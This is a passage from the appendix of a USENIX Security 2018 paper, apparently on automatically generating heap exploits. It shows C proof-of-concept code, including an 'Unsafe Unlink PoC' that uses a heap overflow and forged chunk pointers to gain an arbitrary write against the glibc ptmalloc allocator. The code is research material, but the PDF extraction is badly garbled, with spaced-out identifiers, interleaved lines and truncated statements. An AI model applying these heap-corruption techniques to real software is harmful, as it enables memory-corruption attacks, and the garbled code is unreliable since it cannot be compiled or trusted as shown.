void * d u m m y _ c h u n k = malloc (0 x200 ) ;
free ( d u m m y _ c h u n k ) ;
// A l l o c a t i o n
c t r l _ d a t a _ 0 . g l o b a l _ v a r = malloc ( m a l l o c _ s i z e s←(cid:45)
for ( int i =0; i 
# include 
# include 
# include 
# include 
# include 
typedef struct _ _ a t t r i b u t e _ _ (( _ _ p a c k e d _ _ ) ) {
uint64_t * g l o b a l _ v a r ;
} c o n t r o l l e d _ d a t a ;
typedef struct _ _ a t t r i b u t e _ _ (( _ _ p a c k e d _ _ ) ) {
uint64_t data [0 x20 ];
} s y m b o l i c _ d a t a ;
void winning ( void ) {
puts ( " You win ! " ) ;
}
c o n t r o l l e d _ d a t a _ _ a t t r i b u t e _ _ (( aligned (16) ) ) ←(cid:45)
c o n t r o l l e d _ d a t a _ _ a t t r i b u t e _ _ (( aligned (16) ) ) ←(cid:45)
c t r l _ d a t a _ 0 ;
c t r l _ d a t a _ 1 ;
size_t w r i t e _ t a r g e t [4];
size_t offset ;
size_t h e a d e r _ s i z e ;
size_t m e m 2 c h u n k _ o f f s e t ;
size_t m a l l o c _ s i z e s [2];
size_t f i l l _ s i z e s [2];
size_t o v e r f l o w _ s i z e s [1];
int main ( void ) {
void * d u m m y _ c h u n k = malloc (0 x0 ) ;
}
}
A.5 Unsafe Unlink PoC
The resulting PoC that reaches an AWC exploitation primitive
against ptmalloc, using the unsafe unlink technique.
// ...
size_t w r i t e _ t a r g e t [4];
size_t offset ;
size_t h e a d e r _ s i z e = 0 x20 ;
size_t m e m 2 c h u n k _ o f f s e t 0 x10 ;
size_t m a l l o c _ s i z e s [2] = {0 x80 , 0 x80 };
size_t f i l l _ s i z e s [2] = {0 x20 , 0 x20 }
size_t o v e r f l o w _ s i z e s [1] = {0 x9 }
int main ( void ) {
void * d u m m y _ c h u n k = malloc (0 x0 ) ;
free ( d u m m y _ c h u n k ) ;
// A l l o c a t i o n
c t r l _ d a t a _ 0 . g l o b a l _ v a r = malloc ( m a l l o c _ s i z e s←(cid:45)
c t r l _ d a t a _ 0 . g l o b a l _ v a r [0] = ( uint64_t ) &←(cid:45)
c t r l _ d a t a _ 0 . g l o b a l _ v a r [1] = ( uint64_t ) &←(cid:45)
w r i t e _ t a r g e t ;
[0]) ;
w r i t e _ t a r g e t ;
c t r l _ d a t a _ 0 . g l o b a l _ v a r [2] = ( uint64_t ) 0 x0 ;
c t r l _ d a t a _ 0 . g l o b a l _ v a r [3] = ( uint64_t ) 0 x0 ;
// A l l o c a t i o n
c t r l _ d a t a _ 1 . g l o b a l _ v a r = malloc ( m a l l o c _ s i z e s←(cid:45)
[1]) ;
c t r l _ d a t a _ 1 . g l o b a l _ v a r [0] = ( uint64_t ) 0 x0 ;
// ...
c t r l _ d a t a _ 1 . g l o b a l _ v a r [3] = ( uint64_t ) 0 x0 ;
// VULN : Overflow
offset = m e m 2 c h u n k _ o f f s e t ;
(( uint64_t *) ((( char *) c t r l _ d a t a _ 1 .←(cid:45)
(( uint8_t *) ((( char *) c t r l _ d a t a _ 1 .←(cid:45)
g l o b a l _ v a r ) - offset ) ) [0] = ( uint64_t ) 0←(cid:45)
x90 ;
g l o b a l _ v a r ) - offset +0 x8 ) ) [0] = ( uint8_t ) ←(cid:45)
0 x90 ;
w r i t e _ t a r g e t [0] = ( uint64_t ) 0 x0 ;
w r i t e _ t a r g e t [1] = ( uint64_t ) 0 x0 ;
w r i t e _ t a r g e t [2] = ( uint64_t ) ((( char *) ←(cid:45)
w r i t e _ t a r g e t [3] = ( uint64_t ) ((( char *)←(cid:45)
c t r l _ d a t a _ 0 . g l o b a l _ v a r ) + 8) ;
c t r l _ d a t a _ 0 . g l o b a l _ v a r ) + 0) ;
free ( c t r l _ d a t a _ 1 . g l o b a l _ v a r ) ;
winning () ;
116    27th USENIX Security Symposium
USENIX Association